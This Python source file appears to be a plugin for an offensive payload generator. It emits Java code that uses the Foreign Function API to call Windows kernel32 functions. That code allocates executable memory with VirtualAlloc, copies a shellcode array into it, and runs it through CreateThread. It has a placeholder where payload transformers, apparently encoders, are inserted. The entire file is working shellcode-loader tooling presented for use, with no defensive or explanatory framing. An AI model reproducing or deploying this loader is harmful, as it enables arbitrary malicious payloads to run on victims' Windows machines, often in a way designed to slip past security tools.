class shellcoderunner:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return ["import java.lang.foreign.Arena;",
                "import java.lang.foreign.FunctionDescriptor;",
                "import java.lang.foreign.Linker;",
                "import java.lang.foreign.MemoryLayout;",
                "import java.lang.foreign.MemorySegment;",
                "import java.lang.foreign.SymbolLookup;",
                "import java.lang.foreign.ValueLayout;",
                "import java.lang.invoke.MethodHandle;",
                "import static java.lang.foreign.ValueLayout.*;",]

    def compilerOptions(self) -> list[str]:
        return ['{"returnType": "void*","parameterTypes": ["void*","size_t","int","int"]}',
                '{"returnType": "long long", "parameterTypes": ["void*", "size_t", "void*", "void*", "int", "void*"]}',
                '{"returnType": "int", "parameterTypes": ["long long", "int" ]}']

    def codeblocks(self) -> str:
        return """
    private static final Linker LINKER = Linker.nativeLinker();
    private static final MemoryLayout C_INT     = LINKER.canonicalLayouts().get("int");
    private static final MemoryLayout C_LONG_LONG     = LINKER.canonicalLayouts().get("long long");
    private static final MemoryLayout C_POINTER = LINKER.canonicalLayouts().get("void*");
    public static Arena arena = Arena.ofConfined();
    public static SymbolLookup kernel32 = SymbolLookup.libraryLookup("kernel32.dll", arena);
    public static MethodHandle VirtualAlloc = LINKER.downcallHandle(kernel32.find("VirtualAlloc").orElseThrow(),FunctionDescriptor.of(C_POINTER, C_POINTER, C_LONG_LONG, C_INT, C_INT));
    public static MethodHandle CreateThread = LINKER.downcallHandle(kernel32.find("CreateThread").orElseThrow(),FunctionDescriptor.of(C_LONG_LONG, C_POINTER, C_LONG_LONG, C_POINTER, C_POINTER, C_INT, C_POINTER));
    public static MethodHandle WaitForSingleObject = LINKER.downcallHandle(kernel32.find("WaitForSingleObject").orElseThrow(),FunctionDescriptor.of(C_INT, C_LONG_LONG, C_INT));
"""

    def template(self) -> str:
        return """
        {transformers}
        MemorySegment address = (MemorySegment) VirtualAlloc.invokeExact(MemorySegment.NULL, (long)shellcode.length, 0x3000, 0x40);
        address = address.reinterpret(shellcode.length);
        MemorySegment.copy(MemorySegment.ofArray(shellcode), 0, address, 0, shellcode.length);
        long hThread = (long) CreateThread.invokeExact(MemorySegment.NULL, (long)0, address, MemorySegment.NULL, 0, MemorySegment.NULL);
        int result = (int) WaitForSingleObject.invokeExact(hThread, -1);
"""